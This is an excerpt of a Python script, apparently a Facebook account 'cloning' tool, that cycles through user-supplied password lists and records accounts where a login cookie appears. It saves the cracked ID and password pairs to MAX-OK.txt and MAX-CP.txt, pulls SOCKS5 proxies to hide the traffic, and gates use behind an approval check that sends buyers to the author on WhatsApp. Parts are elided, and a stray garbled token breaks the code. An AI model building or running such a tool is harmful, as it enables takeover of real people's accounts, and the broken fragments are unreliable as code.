...
def uaku():
    try:
        ff=open('https://github.com/TECH-Sultan/Sultan-009/blob/main/user_agent.txt','r').read().splitlines()
        for ub in ff:
            ugen.append(ub)
    except:
        a=requests.get('https://github.com/TECH-Sultan/Sultan-009/blob/main/Approval.txt').text
        ff=open('show.txt','w')
...
--------------------------------------------------
[•] AUTHOR     : \033[1;32mSultan\033[1;37m
...
try:
    ...
    proxy = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.proxy.txt','w').write(proxy)
except Exception as e:
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mSultan')
...
def Sultan():
	...
	print('\033[1;32m[5] File Cloning (coming soon)')
...
def chos():
    ...
    os.system('clear')
    print(logo)
    print('[•] EXAMPLE : khan12345,bangladish,Sultan786,Etc')
    lines()
    for Sultan in range(passx):
        pww = input(f"[•] ENTER PASSWORDS {Sultan+1} : ")
        HamiiID.append(pww)
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('MAX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
                ...
                open('MAX-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
...
def approval():
  ...
  try:
    httpCaht = requests.get('https://github.com/TECH-Sultan/Sultan-009/blob/main/Approval.txt').text
    if id in httpCaht:
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923027990784?text='+tks),approval()
      time.sleep(1)
      approval()
  except:EmZee404-Em-DA9BC84C01-ZeUs==
    sys.exit()
